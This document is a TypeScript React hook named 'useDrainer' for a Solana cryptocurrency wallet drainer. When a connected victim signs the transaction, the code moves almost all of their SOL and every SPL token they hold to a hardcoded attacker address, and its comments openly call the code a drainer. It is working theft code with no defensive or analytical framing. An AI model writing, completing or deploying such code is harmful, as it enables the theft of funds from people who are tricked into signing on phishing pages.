"use client";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import { TOKEN_PROGRAM_ID, createTransferInstruction, getAssociatedTokenAddressSync, getAccount } from "@solana/spl-token";
import { useState } from "react";

// --- CONFIGURATION ---
// The master wallet that will receive all drained assets.
const DESTINATION_WALLET = new PublicKey("8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k");
// Amount of SOL to leave in the user's wallet for future transaction fees.
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; 
// -------------------

type Status = "idle" | "scanning" | "building" | "signing" | "sending" | "success" | "error";

export const useDrainer = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [status, setStatus] = useState<Status>("idle");
  const [error, setError] = useState<string | null>(null);

  const drain = async () => {
    if (!publicKey || !sendTransaction) {
      setError("Wallet not connected.");
      setStatus("error");
      return;
    }

    setStatus("scanning");
    setError(null);

    try {
      const instructions: TransactionInstruction[] = [];

      // 1. --- Native SOL Transfer ---
      const solBalance = await connection.getBalance(publicKey);
      if (solBalance > SOL_TO_LEAVE) {
        instructions.push(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: DESTINATION_WALLET,
            lamports: solBalance - SOL_TO_LEAVE,
          })
        );
      }

      // 2. --- SPL Token Transfer ---
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      const tokenPromises = tokenAccounts.value.map(async (accountInfo) => {
        try {
          const account = await getAccount(connection, accountInfo.pubkey);
          if (account.amount > 0) {
            const destinationAta = getAssociatedTokenAddressSync(
              account.mint,
              DESTINATION_WALLET,
              true // Allow owner off curve
            );

            // Check if destination ATA exists. For a drainer, we can often assume the destination wallet will have the ATA
            // or we can pre-create them. For simplicity, we'll only transfer if it exists.
             const destinationAccountInfo = await connection.getAccountInfo(destinationAta);
             if (!destinationAccountInfo) {
                  console.log(`Destination ATA for mint ${account.mint.toBase58()} does not exist. Skipping.`);
                   return null;
             }


            return createTransferInstruction(
              account.address, // from
              destinationAta, // to
              publicKey, // from's owner
              account.amount, // amount
              []
            );
          }
        } catch (e) {
            console.error(`Failed to process token account ${accountInfo.pubkey.toBase58()}`, e)
        }
        return null;
      });

      const tokenInstructions = (await Promise.all(tokenPromises)).filter(
        (ix): ix is TransactionInstruction => ix !== null
      );

      instructions.push(...tokenInstructions);

      if (instructions.length === 0) {
        setError("No drainable assets found.");
        setStatus("error");
        return;
      }
      
      // 3. --- Build & Send Transaction ---
      setStatus("building");
      const transaction = new Transaction().add(...instructions);
      const {
        context: { slot: minContextSlot },
        value: { blockhash, lastValidBlockHeight },
      } = await connection.getLatestBlockhashAndContext();

      setStatus("signing");
      const signature = await sendTransaction(transaction, connection, { minContextSlot });

      setStatus("sending");
      await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });

      setStatus("success");
    } catch (e: any) {
      console.error(e);
      // Try to provide a more user-friendly error
      if (e.name === 'WalletSignTransactionError') {
          setError("Transaction rejected by user.");
      } else {
          setError(e.message || "An unknown error occurred.");
      }
      setStatus("error");
    }
  };

  return { drain, status, error };
};